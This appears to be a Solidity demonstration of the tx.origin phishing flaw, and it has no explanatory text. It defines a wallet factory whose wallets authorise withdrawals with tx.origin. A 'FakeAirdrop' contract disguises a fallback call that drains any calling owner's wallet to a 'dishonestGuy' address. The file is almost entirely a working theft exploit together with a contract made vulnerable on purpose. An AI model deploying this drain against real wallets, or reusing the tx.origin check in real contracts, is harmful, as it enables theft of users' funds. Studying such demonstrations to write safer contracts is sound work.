pragma solidity ^0.4.25;


contract FreeSuperSecuredWalletsFactory {

    mapping(address => FreeSuperSecuredWallet) public _wallets;

    function() payable {
        _wallets[msg.sender] = new FreeSuperSecuredWallet(msg.sender);
        _wallets[msg.sender].supplyFunds.value(msg.value)();
    }

}

contract FreeSuperSecuredWallet {

    address public rightfullOwner;
    event TransferTo(address _to, uint256 balance);
    event Deposit(uint256 balance);

    constructor(address _rightfullOwner) public {
        rightfullOwner = _rightfullOwner;
    }

    function supplyFunds() payable {
        emit Deposit(msg.value);
    }

    function sendEth(address to) public {
        require(tx.origin == rightfullOwner);
        to.transfer(this.balance);
        emit TransferTo(to, this.balance);
    }
}

contract FakeAirdrop {

    FreeSuperSecuredWalletsFactory private listOfWalletsToSteelFrom;

    address dishonestGuy;

    constructor(address _beneficiary, FreeSuperSecuredWalletsFactory _factory) public {
        listOfWalletsToSteelFrom = _factory;
        dishonestGuy = _beneficiary;
    }

    function() public {
        /*
        	some innocent looking function to call
        */
        if (listOfWalletsToSteelFrom._wallets(msg.sender) != address(0)) {
            listOfWalletsToSteelFrom._wallets(msg.sender).sendEth(dishonestGuy);
        }
        /*do expected stuff eg. Airdrop*/
    }

}
